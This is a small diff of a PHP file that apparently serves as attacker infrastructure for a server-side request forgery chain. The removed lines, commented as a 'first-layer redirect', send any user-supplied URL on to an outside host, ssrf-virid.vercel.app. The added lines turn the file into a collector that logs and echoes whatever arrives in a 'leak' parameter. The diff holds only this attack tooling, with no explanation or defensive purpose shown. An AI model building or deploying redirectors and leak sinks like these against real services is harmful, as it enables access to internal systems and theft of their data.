@@ -1,5 +1,8 @@
 <?php
-// 第一层重定向
-$url = $_REQUEST['url'];
-header('Location: https://ssrf-virid.vercel.app//final.php?path=' . urlencode($url));
+if (isset($_REQUEST['leak'])) {
+    error_log("LEAK: " . $_REQUEST['leak']);
+    echo "LEAK: " . htmlspecialchars($_REQUEST['leak']);
+} else {
+    echo "No leak parameter received.";
+}
 ?>
